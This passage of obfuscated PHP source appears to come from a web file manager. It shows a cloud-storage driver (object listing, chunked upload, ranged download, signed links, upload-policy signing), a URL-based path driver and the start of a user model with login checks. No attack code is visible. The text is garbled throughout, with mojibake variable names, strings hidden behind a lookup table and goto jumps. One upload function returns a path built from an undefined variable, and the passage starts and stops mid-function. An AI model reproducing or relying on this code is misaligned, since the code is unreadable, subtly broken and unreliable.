$€¥‚ıèØ = false) { $Æœ ¹ñ =& $_SERVER[¼èá¯æÙ]; $‡Ğƒ¤Ïš = $Æœ ¹ñ[12]; $ñï‡ÜŠ¦ = 1000; $¹íƒüß = rtrim($ÁÑÕÎ‘õ, $Æœ ¹ñ[8]) . $Æœ ¹ñ[8]; while (!0) { check_abort(); $ñ´Ô÷¶÷ = $this->listObjs($ÁÑÕÎ‘õ, $‡Ğƒ¤Ïš, $ñï‡ÜŠ¦); if (!$ñ´Ô÷¶÷) { return !1; } $‡Ğƒ¤Ïš = isset($ñ´Ô÷¶÷[$Æœ ¹ñ[1580]]) ? $ñ´Ô÷¶÷[$Æœ ¹ñ[1580]] : $Æœ ¹ñ[12]; $õŒï¢ñ = isset($ñ´Ô÷¶÷[$Æœ ¹ñ[1581]]) ? $ñ´Ô÷¶÷[$Æœ ¹ñ[1581]] : array(); foreach ($õŒï¢ñ as $îêê²ñé) { $Òêèëøµ = $îêê²ñé[$Æœ ¹ñ[33]] == $Æœ ¹ñ[88] ? !0 : !1; $‰‚ÀŒçÛ = ltrim($¹íƒüß . $îêê²ñé[$Æœ ¹ñ[32]], $Æœ ¹ñ[8]) . ($Òêèëøµ ? $Æœ ¹ñ[8] : $Æœ ¹ñ[12]); $ì‚ËÜœ­ = array($Æœ ¹ñ[32] => $‰‚ÀŒçÛ, $Æœ ¹ñ[33] => $Òêèëøµ ? $Æœ ¹ñ[88] : $Æœ ¹ñ[242], $Æœ ¹ñ[89] => $îêê²ñé[$Æœ ¹ñ[424]], $Æœ ¹ñ[1576] => $îêê²ñé[$Æœ ¹ñ[1582]]); $this->cacheMethodInfoSet($‰‚ÀŒçÛ, $Òêèëøµ, $ì‚ËÜœ­); if ($Òêèëøµ) { $ßöÑ¼¹Å[] = $‰‚ÀŒçÛ; if ($€¥‚ıèØ) { $this->fileList($‰‚ÀŒçÛ, $ßöÑ¼¹Å, $àÖØîËÔ, $€¥‚ıèØ); } continue; } $àÖØîËÔ[] = $ì‚ËÜœ­; } if (count($õŒï¢ñ) < $ñï‡ÜŠ¦) { break; } } $this->cacheMethodInfoSet($ÁÑÕÎ‘õ, !0); } public function listPath($¹ªÕ³äê, $€â ”Ê­ = false) { $°Æ‡ÕÅÍ =& $_SERVER[¼èá¯æÙ]; $Ù²­½œŸ = $€ŒÔõÄ = array(); $this->fileList($¹ªÕ³äê, $Ù²­½œŸ, $€ŒÔõÄ); foreach ($Ù²­½œŸ as $¾ÎÅû  => $‚²­ı‰î) { $Ù²­½œŸ[$¾ÎÅû ] = $this->folderInfo($‚²­ı‰î, $€â ”Ê­); } foreach ($€ŒÔõÄ as $¾ÎÅû  => $‚²­ı‰î) { $€ŒÔõÄ[$¾ÎÅû ] = $this->fileInfo($‚²­ı‰î[$°Æ‡ÕÅÍ[32]], $€â ”Ê­, $‚²­ı‰î); } return array($°Æ‡ÕÅÍ[95] => $Ù²­½œŸ, $°Æ‡ÕÅÍ[96] => $€ŒÔõÄ); } public function has($Ÿêõøëã, $Ñ±ÂÜÛÌ = false, $ë¼†ïß“ = true) { $­ÒŠÊ†€ =& $_SERVER[¼èá¯æÙ]; $Å³©è¦ğ = $­ÒŠÊ†€[12]; $‘ıæäÂ = 500; $ßŒİœæ = 0; $ã±Á©¨ = 0; $àŒÂ™ÏÓ = rtrim($Ÿêõøëã, $­ÒŠÊ†€[8]) . $­ÒŠÊ†€[8]; while (!0) { check_abort(); $ÇõäÅÏù = $this->listObjs($Ÿêõøëã, $Å³©è¦ğ, $‘ıæäÂ); if (!$ÇõäÅÏù) { return !1; } $Å³©è¦ğ = isset($ÇõäÅÏù[$­ÒŠÊ†€[1580]]) ? $ÇõäÅÏù[$­ÒŠÊ†€[1580]] : $­ÒŠÊ†€[12]; $ÚôºåÔÊ = isset($ÇõäÅÏù[$­ÒŠÊ†€[1581]]) ? $ÇõäÅÏù[$­ÒŠÊ†€[1581]] : array(); if (empty($ÚôºåÔÊ)) { break; } $ÂŠÕ½ª = array_filter($ÚôºåÔÊ, function ($«½º¯Ô) { $Ä¸‚ÂŠë =& $_SERVER[¼èá¯æÙ]; return $«½º¯Ô[$Ä¸‚ÂŠë[33]] == $Ä¸‚ÂŠë[88]; }); $®Ÿö°î™ = count($ÚôºåÔÊ); $ÂŠÕ½ª = count($ÂŠÕ½ª); $Îıñ©áø = $®Ÿö°î™ - $ÂŠÕ½ª; if ($Ñ±ÂÜÛÌ) { $ã±Á©¨ += $ÂŠÕ½ª; $ßŒİœæ += $Îıñ©áø; if ($®Ÿö°î™ < $‘ıæäÂ) { break; } continue; } if ($ë¼†ïß“) { if ($Îıñ©áø) { return !0; } } else { if ($ÂŠÕ½ª) { return !0; } } if ($®Ÿö°î™ < $‘ıæäÂ) { break; } } if ($Ñ±ÂÜÛÌ) { return array($­ÒŠÊ†€[251] => $ßŒİœæ, $­ÒŠÊ†€[252] => $ã±Á©¨); } return !1; } public function listAll($Á€ıÇÔÇ) { $ƒÉ¥ÑÓÕ =& $_SERVER[¼èá¯æÙ]; $¼µÂÆ¿€ = $²æºÃÎÓ = array(); $this->fileList($Á€ıÇÔÇ, $¼µÂÆ¿€, $²æºÃÎÓ, !0); $†üÙ÷íÉ = array_to_keyvalue($²æºÃÎÓ, $ƒÉ¥ÑÓÕ[32]); foreach ($¼µÂÆ¿€ as $…Ç‹¹Ü·) { if (is_string($…Ç‹¹Ü·)) { $†üÙ÷íÉ[$…Ç‹¹Ü·] = array($ƒÉ¥ÑÓÕ[89] => 0); } } return $this->listAllFiles($Á€ıÇÔÇ, $†üÙ÷íÉ); } public function canRead($èàÙìƒì) { return $this->exist($èàÙìƒì) ? !0 : !1; } public function canWrite($¨ŒøçÑÜ) { return $this->exist($¨ŒøçÑÜ) ? !0 : !1; } public function getContent($æø¶ƒÍ) { return $this->fileSubstr($æø¶ƒÍ, 0, -1); } public function setContent($ò¼Ú´Ï, $áÎçİùØ = '') { $èĞ›ñœ± =& $_SERVER[¼èá¯æÙ]; if (!$áÎçİùØ) { $Îûç‰áÓ = $this->ussRequest($ò¼Ú´Ï, $èĞ›ñœ±[299]); return $Îûç‰áÓ[$èĞ›ñœ±[1302]]; } $ñÌ¢™¨ = $this->tempFile($this->pathThis($ò¼Ú´Ï)); file_put_contents($ñÌ¢™¨, $áÎçİùØ); if ($this->upload($ò¼Ú´Ï, $ñÌ¢™¨)) { $this->tempFileRemve($ñÌ¢™¨); return !0; } return !1; } public function fileSubstr($Õ“äâí“, $ÉğèÏÒ, $·×òŒã) { $ÓûÖ’Ê« =& $_SERVER[¼èá¯æÙ]; if (!($òşú¤ = $this->link($Õ“äâí“))) { return !1; } $şÚƒÑÁğ = !1; if ($·×òŒã > 0) { $â’óØ™ = $ÉğèÏÒ + $·×òŒã - 1; $şÚƒÑÁğ = array($ÓûÖ’Ê«[1541] . $ÉğèÏÒ . $ÓûÖ’Ê«[473] . $â’óØ™); } $î„Åøé³ = url_request($òşú¤, $ÓûÖ’Ê«[1501], !1, $şÚƒÑÁğ); return $î„Åøé³[$ÓûÖ’Ê«[832]] ? $î„Åøé³[$ÓûÖ’Ê«[1292]] : !1; } public function upload($±£×Ü×©, $í°ôÄ˜¤, $„Üèö¶ = false, $¢˜‚ÆŸ = REPEAT_REPLACE) { $ì“óŒ =& $_SERVER[¼èá¯æÙ]; $´´¯æíé = IO::size($í°ôÄ˜¤); if ($´´¯æíé <= 1024 * 1024 * 200) { $¡Ã©õŒ½ = array($ì“óŒ[1583] . $í°ôÄ˜¤); $ô‰«ÊŠË = $this->ussRequest($±£×Ü×©, $ì“óŒ[265], $¡Ã©õŒ½); return $ô‰«ÊŠË[$ì“óŒ[1302]] ? $this->getPathOuter($±£×Ü×©) : !1; } $ŒÖ£¯ò = 1024 * 1024 * 10; $§ñëõ£ = array($ì“óŒ[1584], $ì“óŒ[1585] . $´´¯æíé, $ì“óŒ[1586], $ì“óŒ[1587] . $ŒÖ£¯ò); $ô‰«ÊŠË = $this->ussRequest($±£×Ü×©, $ì“óŒ[265], !1, $§ñëõ£); if (!$ô‰«ÊŠË[$ì“óŒ[1302]]) { return !1; } $–üƒª²ç = $ô‰«ÊŠË[$ì“óŒ[1292]]; $Ğó¯˜·º = 0; $ÔİÈãá = $–üƒª²ç[$ì“óŒ[1588]]; $êœ¢Ò = fopen($í°ôÄ˜¤, $ì“óŒ[1464]); if (!$êœ¢Ò) { return !1; } do { $ª¹ãéè = $–üƒª²ç[$ì“óŒ[1589]]; fseek_64($êœ¢Ò, $Ğó¯˜·º); $Å‡ñ¡à­ = fread($êœ¢Ò, $ª¹ãéè); $«È×ÄÃä = 0; do { $«È×ÄÃä++; $–üƒª²ç = $this->uploadPart($±£×Ü×©, $–üƒª²ç, $Å‡ñ¡à­); } while (!$–üƒª²ç && $«È×ÄÃä < 3); if (!$–üƒª²ç) { return !1; } $ÔİÈãá = $–üƒª²ç[$ì“óŒ[1588]]; $Ğó¯˜·º += $ª¹ãéè; } while ($ÔİÈãá != -1); fclose($êœ¢Ò); $§ñëõ£ = array($ì“óŒ[1590], $ì“óŒ[1591] . $–üƒª²ç[$ì“óŒ[1592]], $ì“óŒ[1586]); $ô‰«ÊŠË = $this->ussRequest($±£×Ü×©, $ì“óŒ[265], !1, $§ñëõ£); return $ô‰«ÊŠË[$ì“óŒ[1302]] ? $this->getPathOuter($·„—îù˜) : !1; } private function uploadPart($‡–Ø©õí, $‚çÔÖ§, &$ú©¡Øö¹) { $ã­ÃÏî² =& $_SERVER[¼èá¯æÙ]; $¡‚ÉàÃ… = array($ã­ÃÏî²[1593], $ã­ÃÏî²[1591] . $‚çÔÖ§[$ã­ÃÏî²[1592]], $ã­ÃÏî²[1594] . $‚çÔÖ§[$ã­ÃÏî²[1588]], $ã­ÃÏî²[156] . $‚çÔÖ§[$ã­ÃÏî²[1589]]); $–¡–†¡¢ = $this->ussRequest($‡–Ø©õí, $ã­ÃÏî²[265], $ú©¡Øö¹, $¡‚ÉàÃ…); return !$–¡–†¡¢[$ã­ÃÏî²[1302]] ? $–¡–†¡¢[$ã­ÃÏî²[1302]] : $–¡–†¡¢[$ã­ÃÏî²[1292]]; } public function uploadFormData($¢‡˜œÕ®, $Åîß£­ = 3600) { return $this->uploadPolicy($¢‡˜œÕ®, $Åîß£­); } public function uploadMultiData($ìÉøê•À, $”¥Üå¢· = 3600) { $•Õ…ã»¬ =& $_SERVER[¼èá¯æÙ]; $«†î€—‡ = (int) $GLOBALS[$•Õ…ã»¬[7]][$•Õ…ã»¬[89]]; return $this->uploadPolicy($ìÉøê•À, $”¥Üå¢·, $«†î€—‡); } private function uploadPolicy($õ™ê¹µÑ, $À«½ôëí = 3600, $şäå û = 0) { $ì¨…ú»Î =& $_SERVER[¼èá¯æÙ]; $äƒüçõ = $ì¨…ú»Î[8] . $this->bucket; $Â  ³ëƒ = gmdate($ì¨…ú»Î[1499]); $ ·úôïê = array($ì¨…ú»Î[1595] => $this->bucket, $ì¨…ú»Î[1596] => $õ™ê¹µÑ, $ì¨…ú»Î[1597] => time() + $À«½ôëí, $ì¨…ú»Î[1598] => $Â  ³ëƒ); if ($şäå û) { $ ·úôïê[$ì¨…ú»Î[1484]] = $şäå û; } $Î“ã²š = base64_encode(json_encode($ ·úôïê)); $¦ÒÎ§ş‡ = base64_encode(hash_hmac($ì¨…ú»Î[1552], "\120\x4f\123\x54\46{$äƒüçõ}\46{$Â  ³ëƒ}\x26{$Î“ã²š}", md5("{$this->userpass}"), !0)); $èàƒÔ¿ä = array($ì¨…ú»Î[289] => $Î“ã²š, $ì¨…ú»Î[1599] => "\x55\120\131\x55\116\40{$this->username}\x3a{$¦ÒÎ§ş‡}", $ì¨…ú»Î[218] => $this->endpoint . $äƒüçõ); return $èàƒÔ¿ä; } public function download($Üß¿”°ò, $ûªŠˆıç) { $ıëªÜ = IO::getPathInner(IO::mkfile($ûªŠˆıç)); if (!($‚„öÒš = $this->link($Üß¿”°ò))) { return !1; } $šâªø—Ë = 0; $âêÂÇ“Í = 1024 * 200; $ıô…§µö = fopen($ıëªÜ, $_SERVER[¼èá¯æÙ][1547]); while (!0) { $ÜÛŞâËø = $this->fileSubstr($Üß¿”°ò, $šâªø—Ë, $âêÂÇ“Í); if ($ÜÛŞâËø === !1) { return !1; } fwrite($ıô…§µö, $ÜÛŞâËø); $šâªø—Ë += $âêÂÇ“Í; if (strlen($ÜÛŞâËø) < $âêÂÇ“Í) { break; } } fclose($ıô…§µö); return $ûªŠˆıç; } public function link($÷ŸÏË©½, $£Ç¡Å = array()) { $µ†äÛßÀ =& $_SERVER[¼èá¯æÙ]; $÷ŸÏË©½ = trim($÷ŸÏË©½, $µ†äÛßÀ[8]); if (!empty($this->token)) { $Ç¼ÎÁÙë = strtotime(date($µ†äÛßÀ[1600])); $¡úøğÀ‰ = substr(md5($this->token . $µ†äÛßÀ[296] . $Ç¼ÎÁÙë . $µ†äÛßÀ[1601] . $÷ŸÏË©½), 12, 8) . $Ç¼ÎÁÙë; $£Ç¡Å[] = $µ†äÛßÀ[1602] . $¡úøğÀ‰; } $¤º½åÄ = !empty($£Ç¡Å) ? $µ†äÛßÀ[86] . implode($µ†äÛßÀ[296], $£Ç¡Å) : $µ†äÛßÀ[12]; return $this->getHost() . $µ†äÛßÀ[8] . $this->pathEncode($÷ŸÏË©½) . $¤º½åÄ; } public function fileOut($ÍøÖ¾, $Ìê³ªáÙ = false, $Û¾ÎÁÆà = false, $£­ìÑÁ› = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ÍøÖ¾, $Ìê³ªáÙ, $Û¾ÎÁÆà, $£­ìÑÁ›); } if (!$Û¾ÎÁÆà) { $Û¾ÎÁÆà = $this->pathThis($ÍøÖ¾); } $æÅüÎŠØ = $Ìê³ªáÙ ? array($_SERVER[¼èá¯æÙ][1603] . rawurlencode($Û¾ÎÁÆà)) : array(); $Æ™êĞ˜« = $this->link($ÍøÖ¾, $æÅüÎŠØ); $this->fileOutLink($Æ™êĞ˜«); } public function fileOutServer($şØ©¯ú, $¹ìêÓŞŞ = false, $·Ğ®†°î = false, $å—úÄÒ = '') { parent::fileOut($şØ©¯ú, $¹ìêÓŞŞ, $·Ğ®†°î, $å—úÄÒ); } public function fileOutImage($¸ÌÛ²¶Ì, $¼…Š‡Ö· = 250) { $™²ç˜³• = $this->link($¸ÌÛ²¶Ì . $_SERVER[¼èá¯æÙ][1604] . $¼…Š‡Ö·); $this->fileOutLink($™²ç˜³•); } public function fileOutImageServer($Ôı¶¡‹, $ÍóĞÃíœ = 250) { parent::fileOutImage($Ôı¶¡‹, $ÍóĞÃíœ); } public function hashMd5($ä¯ïÂä“) { $Ìå¬âŞÊ =& $_SERVER[¼èá¯æÙ]; $ïÀŒ˜Å = $this->_objectMeta($ä¯ïÂä“); return isset($ïÀŒ˜Å[$Ìå¬âŞÊ[257]]) ? $ïÀŒ˜Å[$Ìå¬âŞÊ[257]] : !1; } public function size($Õ¨®ãœ) { $äæî•™ = $this->objectMeta($Õ¨®ãœ); return $äæî•™ ? $äæî•™[$_SERVER[¼èá¯æÙ][89]] : 0; } public function info($­é“¢€Â) { if ($this->isFolder($­é“¢€Â)) { return $this->folderInfo($­é“¢€Â); } else { if ($this->isFile($­é“¢€Â)) { return $this->fileInfo($­é“¢€Â); } } return !1; } public function exist($°õŞâî) { return $this->isFile($°õŞâî) || $this->isFolder($°õŞâî); } public function isFile($Õ­¿§Ÿ) { return !$this->isFolder($Õ­¿§Ÿ) && $this->objectMeta($Õ­¿§Ÿ); } public function isFolder($Ç´«ß•) { return $this->cacheMethod($_SERVER[¼èá¯æÙ][189], $Ç´«ß•); } protected function objectMeta($ª×±º—ß) { return $this->cacheMethod($_SERVER[¼èá¯æÙ][191], $ª×±º—ß); } protected function _objectMeta($Ñ¯›åäú) { $Äúë°™¯ =& $_SERVER[¼èá¯æÙ]; if ($Ñ¯›åäú == $Äúë°™¯[12] || $Ñ¯›åäú == $Äúë°™¯[8]) { return array(); } $Ø¶Ìº™ = $this->ussRequest($Ñ¯›åäú, $Äúë°™¯[1605]); if (!$Ø¶Ìº™[$Äúë°™¯[1302]]) { return null; } $¼°ß°Ïå = isset($Ø¶Ìº™[$Äúë°™¯[1292]]) ? $Ø¶Ìº™[$Äúë°™¯[1292]] : array(); if (!isset($¼°ß°Ïå[$Äúë°™¯[1606]])) { return null; } $ãêø°ßÁ = array($Äúë°™¯[33] => isset($¼°ß°Ïå[$Äúë°™¯[1606]]) ? $¼°ß°Ïå[$Äúë°™¯[1606]] : null, $Äúë°™¯[89] => isset($¼°ß°Ïå[$Äúë°™¯[1607]]) ? $¼°ß°Ïå[$Äúë°™¯[1607]] : null, $Äúë°™¯[257] => isset($¼°ß°Ïå[$Äúë°™¯[1608]]) ? $¼°ß°Ïå[$Äúë°™¯[1608]] : null, $Äúë°™¯[1575] => isset($¼°ß°Ïå[$Äúë°™¯[1609]]) ? $¼°ß°Ïå[$Äúë°™¯[1609]] : null); $ãêø°ßÁ[$Äúë°™¯[1576]] = isset($¼°ß°Ïå[$Äúë°™¯[1610]]) ? strtotime($¼°ß°Ïå[$Äúë°™¯[1610]]) : $ãêø°ßÁ[$Äúë°™¯[1575]]; return $ãêø°ßÁ; } protected function _isFolder($è–·úîë) { $õ¼„ûÊÂ =& $_SERVER[¼èá¯æÙ]; if ($è–·úîë == $õ¼„ûÊÂ[12] || $è–·úîë == $õ¼„ûÊÂ[8]) { return !0; } $ÁØœŒ = $this->_objectMeta($è–·úîë); return isset($ÁØœŒ[$õ¼„ûÊÂ[33]]) && $ÁØœŒ[$õ¼„ûÊÂ[33]] == $õ¼„ûÊÂ[88] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ÜÒÍ”ú­ = false) { } public function exist($ïµ’ëü ) { $¦¸£ÎöØ = $this->info($ïµ’ëü ); return $¦¸£ÎöØ[$_SERVER[¼èá¯æÙ][244]]; } public function isFile($‘ÑëĞŠ ) { $Ú×´ÏÃİ = $this->info($‘ÑëĞŠ ); return $Ú×´ÏÃİ[$_SERVER[¼èá¯æÙ][244]]; } public function isFolder($¼¢Ê´ªå) { return !1; } public function size($º’»¥À†) { $òå¢‡û² = $this->info($º’»¥À†); return $òå¢‡û²[$_SERVER[¼èá¯æÙ][89]]; } public function info($ğ«ï›Éí) { return $this->infoParse($ğ«ï›Éí); } public function infoAuth($Ÿ¦¤È¥•) { return $this->infoParse($Ÿ¦¤È¥•); } public function infoWithChildren($‹Ùåé®) { return $this->infoParse($‹Ùåé®); } public function infoFull($İ‡­¶¥¹) { return $this->infoParse($İ‡­¶¥¹); } private function infoParse($ı™şñ‹ñ) { $†è…² =& $_SERVER[¼èá¯æÙ]; $£ÄÇñªú = $this->header($ı™şñ‹ñ); if (!$£ÄÇñªú || !$£ÄÇñªú[$†è…²[832]]) { return !1; } $óÁŸçğÓ = _get($£ÄÇñªú, $†è…²[424], 0); $°‚çÑ†ò = array($†è…²[32] => $£ÄÇñªú[$†è…²[32]], $†è…²[97] => $ı™şñ‹ñ, $†è…²[33] => $†è…²[242], $†è…²[89] => intval($óÁŸçğÓ), $†è…²[179] => get_path_ext($£ÄÇñªú[$†è…²[32]]), $†è…²[1461] => $óÁŸçğÓ > 0 && $£ÄÇñªú[$†è…²[1611]], $†è…²[1462] => !1); return $°‚çÑ†ò; } private function header($’†Á ³á) { $ˆ¡†„İ =& $_SERVER[¼èá¯æÙ]; if (isset(self::$_cacheHeader[$’†Á ³á])) { return self::$_cacheHeader[$’†Á ³á]; } $òœ Ãõ€ = isset($GLOBALS[$ˆ¡†„İ[1612]]) ? $GLOBALS[$ˆ¡†„İ[1612]] : !1; $GLOBALS[$ˆ¡†„İ[1612]] = !0; self::$_cacheHeader[$’†Á ³á] = url_header($’†Á ³á); $GLOBALS[$ˆ¡†„İ[1612]] = $òœ Ãõ€; return self::$_cacheHeader[$’†Á ³á]; } public function hashSimple($ƒÎ™œúö, $£½éïÀ± = false) { $øà­‡Ó =& $_SERVER[¼èá¯æÙ]; $Ë‘ôİÍ£ = $this->info($ƒÎ™œúö); if (!$Ë‘ôİÍ£ || !$Ë‘ôİÍ£[$øà­‡Ó[244]]) { return !1; } $„ŒæñÕ = $Ë‘ôİÍ£[$øà­‡Ó[89]]; $Š¦Î€ÂÊ = 200; $ã¬ûÙÜ• = 50; if ($„ŒæñÕ <= $Š¦Î€ÂÊ * $ã¬ûÙÜ•) { return md5($this->fileSubstr($ƒÎ™œúö, 0, $„ŒæñÕ)) . $„ŒæñÕ; } $­ÒÄŒàñ = intval($„ŒæñÕ / $ã¬ûÙÜ•); $®ì‚ŒÖ° = $øà­‡Ó[12]; $ÁÃ¢Ïı = timeFloat(); $¸Œù„İê = 15; for ($§êÍ‚Â = 0; $§êÍ‚Â < $ã¬ûÙÜ•; $§êÍ‚Â++) { if (timeFloat() - $ÁÃ¢Ïı > $¸Œù„İê) { return !1; } $ÎÖê®Ò² = $this->fileSubstr($ƒÎ™œúö, $­ÒÄŒàñ * $§êÍ‚Â, $Š¦Î€ÂÊ); if (!$ÎÖê®Ò²) { return !1; } $®ì‚ŒÖ° .= $ÎÖê®Ò²; } $®ì‚ŒÖ° .= $this->fileSubstr($ƒÎ™œúö, $„ŒæñÕ - $Š¦Î€ÂÊ, $Š¦Î€ÂÊ); return md5($®ì‚ŒÖ°) . $„ŒæñÕ; } public function getContent($Ú¯ıâ«) { return $this->fileSubstr($Ú¯ıâ«); } public function fileSubstr($£ü‚“Ù‰, $»•¦ùÓş = 0, $Ç éÅÅØ = -1) { $ã¡¦­”é =& $_SERVER[¼èá¯æÙ]; $Ïº™²Á = $this->info($£ü‚“Ù‰); if (!$Ïº™²Á || !$Ïº™²Á[$ã¡¦­”é[244]] && $Ïº™²Á[$ã¡¦­”é[89]] > 1024 * 1024 * 10) { return !1; } if ($Ç éÅÅØ === -1) { $Ç éÅÅØ = $Ïº™²Á[$ã¡¦­”é[89]]; } if ($Ç éÅÅØ == 0) { return $ã¡¦­”é[12]; } $Àíì¶Ã = array($ã¡¦­”é[1613] . $»•¦ùÓş . $ã¡¦­”é[868] . ($»•¦ùÓş + $Ç éÅÅØ - 1)); $ …·¼É = url_request($£ü‚“Ù‰, $ã¡¦­”é[1501], !1, $Àíì¶Ã, !1, !1, 30); return $ …·¼É[$ã¡¦­”é[1292]] ? $ …·¼É[$ã¡¦­”é[1292]] : $ã¡¦­”é[12]; } public function download($Ïüì¯—ï, $í·©Ûù‡) { Downloader::start($Ïüì¯—ï, $í·©Ûù‡); return $í·©Ûù‡; } } goto fÆÊÜ“øõ´; D‚áÎÀÑ“è: class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\162"; protected $tableMeta = array("\164\x61\142\154\x65\116\x61\155\145" => "\165\x73\x65\x72\137\155\x65\x74\x61", "\155\x65\164\141\x46\151\145\154\x64" => "\x75\163\x65\162\111\104"); protected $simpleField = "\165\163\x65\x72\x49\x44\x2c\156\x69\x63\153\116\x61\155\x65\54\156\x61\155\x65\54\x61\x76\x61\x74\x61\x72\54\x73\145\170\x2c\163\164\x61\x74\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($øï´†ù¡) { $ÔŒ»Äè =& $_SERVER[¼èá¯æÙ]; $°êó²ª— = $ÔŒ»Äè[2470]; return array($ÔŒ»Äè[2061] => array($øï´†ù¡[0], $°êó²ª—), $ÔŒ»Äè[2063] => array($øï´†ù¡[0], $°êó²ª—), $ÔŒ»Äè[2471] => array($øï´†ù¡[0], $°êó²ª—)); } protected function getInfo($ø»ŠôŸ×, $˜Ñğ¸Ó× = false) { $¿‘Íô§ë = $this->getInfoSimple($ø»ŠôŸ×); if (!is_array($¿‘Íô§ë)) { return array(); } if ($˜Ñğ¸Ó×) { return $this->_getInfoApply($¿‘Íô§ë); } return $this->cacheFunctionGet($_SERVER[¼èá¯æÙ][2065], $ø»ŠôŸ×); } protected function getInfoFull($ı½– ô, $½†­ŠÖ– = false) { $ÇäÛÈÀä = $this->getInfoSimple($ı½– ô); if (!is_array($ÇäÛÈÀä)) { return array(); } if ($½†­ŠÖ–) { return $this->_getInfoApply($ÇäÛÈÀä, !0); } return $this->cacheFunctionGet($_SERVER[¼èá¯æÙ][2472], $ı½– ô); } private function _getInfoApply($³ì“óñ°, $Œæ‡Şöø = false) { $ˆìÓØÊ« =& $_SERVER[¼èá¯æÙ]; if (!$³ì“óñ°) { return $³ì“óñ°; } $İµÇ°ƒ = md5($ˆìÓØÊ«[2473] . $³ì“óñ°[$ˆìÓØÊ«[971]] . $ˆìÓØÊ«[2474] . $³ì“óñ°[$ˆìÓØÊ«[32]]); $³ì“óñ° = $this->_listDataApplyItem($³ì“óñ°); $¢èËÆ™‘ = Model($ˆìÓØÊ«[1426])->metaGet($³ì“óñ°[$ˆìÓØÊ«[100]][$ˆìÓØÊ«[203]]); $³ì“óñ°[$ˆìÓØÊ«[2475]] = $İµÇ°ƒ; $³ì“óñ°[$ˆìÓØÊ«[100]][$ˆìÓØÊ«[2264]] = isset($¢èËÆ™‘[$ˆìÓØÊ«[2265]]) ? $¢èËÆ™‘[$ˆìÓØÊ«[2265]] : null; if ($Œæ‡Şöø) { $³ì“óñ°[$ˆìÓØÊ«[550]] = $this->metaGet($³ì“óñ°[$ˆìÓØÊ«[1778]]); } return $³ì“óñ°; } protected function getInfoSimple($È‚¾åË, $§˜Íë¿ô = false) { $ƒÒıÃ« =& $_SERVER[¼èá¯æÙ]; if (!$È‚¾åË) { return array(); } if ($§˜Íë¿ô) { $šŸÄ÷›¬ = $this->where(array($ƒÒıÃ«[1778] => intval($È‚¾åË)))->find(); if (!is_array($šŸÄ÷›¬)) { return array(); } $šŸÄ÷›¬[$ƒÒıÃ«[2476]] = Action($ƒÒıÃ«[2477])->parseUrl($šŸÄ÷›¬[$ƒÒıÃ«[2476]]); return $šŸÄ÷›¬; } return $this->cacheFunctionGet($ƒÒıÃ«[2066], $È‚¾åË); } protected function getInfoSimpleOuter($…æíÃöÕ) { $í›×ßŒğ =& $_SERVER[¼èá¯æÙ]; if (!$…æíÃöÕ || $…æíÃöÕ == 0) { return array($í›×ßŒğ[1778] => $í›×ßŒğ[240], $í›×ßŒğ[32] => $í›×ßŒğ[186] . LNG($í›×ßŒğ[2478]) . $í›×ßŒğ[188], $í›×ßŒğ[2476] => STATIC_PATH . $í›×ßŒğ[2479]); } $Í‰û®Ê = $this->cacheFunctionGet($í›×ßŒğ[2066], $…æíÃöÕ); $­êı¬©å = array_field_key($Í‰û®Ê, explode($í›×ßŒğ[50], $this->simpleField)); if (!$­êı¬©å) { return array($í›×ßŒğ[1778] => $í›×ßŒğ[1278], $í›×ßŒğ[32] => $í›×ßŒğ[186] . LNG($í›×ßŒğ[2480]) . $í›×ßŒğ[188], $í›×ßŒğ[2476] => STATIC_PATH . $í›×ßŒğ[2481]); } $­êı¬©å[$í›×ßŒğ[2476]] = Action($í›×ßŒğ[2477])->parseUrl($­êı¬©å[$í›×ßŒğ[2476]]); return $­êı¬©å; } protected function groupUser($Ä•å—–§) { } public static function errorLang($õÖ½’”¦) { $­öØ–İê =& $_SERVER[¼èá¯æÙ]; $ãğ‘ÔÀ¡ = array(self::ERROR_USER_NOT_EXISTS => $­öØ–İê[2482], self::ERROR_USER_PASSWORD_ERROR => $­öØ–İê[2483], self::ERROR_USER_EXIST_NAME => $­öØ–İê[2484], self::ERROR_USER_EXIST_PHONE => $­öØ–İê[2485], self::ERROR_USER_EXIST_EMAIL => $­öØ–İê[2486], self::ERROR_USER_LOGIN_LOCK => $­öØ–İê[2487], self::ERROR_IP_NOT_ALLOW => $­öØ–İê[2488], self::ERROR_USER_EXIST_NICKNAME => $­öØ–İê[2489]); $¡İĞæ = LNG($ãğ‘ÔÀ¡[$õÖ½’”¦]); if ($õÖ½’”¦ == self::ERROR_USER_LOGIN_LOCK) { $‘Èõ—üË = (int) Model($­öØ–İê[2490])->get($­öØ–İê[2491]); if ($‘Èõ—üË > 60) { $¡İĞæ = str_replace($­öØ–İê[101], ceil($‘Èõ—üË / 60), $¡İĞæ); } } return $¡İĞæ; } protected function metaSet($ÇÌŞ—ëğ, $ò›©¶şá = null, $¡®’è†½ = null) { $this->clearCache($ÇÌŞ—ëğ); return parent::metaSet($ÇÌŞ—ëğ, $ò›©¶şá, $¡®’è†½); } public function getInfoByMeta($–Ä‹¼ÎÀ, $ËÇ¢ÌÃ¬) { $¸£“ùÛ =& $_SERVER[¼èá¯æÙ]; $·ó¨Š›¦ = Model($¸£“ùÛ[2492])->where(array($¸£“ùÛ[107] => $–Ä‹¼ÎÀ, $¸£“ùÛ[462] => $ËÇ¢ÌÃ¬))->find(); if ($·ó¨Š›¦) { return $this->getInfo($·ó¨Š›¦[$¸£“ùÛ[1778]]); } return !1; } public function userLoginCheck($ÎŞÙåÛ¨, $éõÉõĞ) { $‡£³”ë =& $_SERVER[¼èá¯æÙ]; $ˆÆßÏ÷ï = $this->userLoginFind($ÎŞÙåÛ¨); if (!$ˆÆßÏ÷ï) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ˆÆßÏ÷ï[$‡£³”ë[1778]], $éõÉõĞ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($ˆÆßÏ÷ï[$‡£³”ë[1778]]); } public function userLoginFind($ƒÚ±€şä) { $Í”Ï© =& 